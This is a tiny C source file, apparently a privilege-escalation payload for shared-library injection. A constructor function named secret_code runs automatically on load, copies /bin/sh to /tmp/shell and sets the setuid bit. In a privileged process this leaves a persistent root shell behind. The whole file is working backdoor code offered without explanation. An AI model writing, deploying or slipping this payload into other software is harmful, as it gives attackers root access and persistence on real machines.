#include <stdio.h>
#include <stdlib.h>

void secret_code() __attribute__((constructor));

void secret_code() {
    system("cp /bin/sh /tmp/shell");
    system("chmod +s /tmp/shell");
}
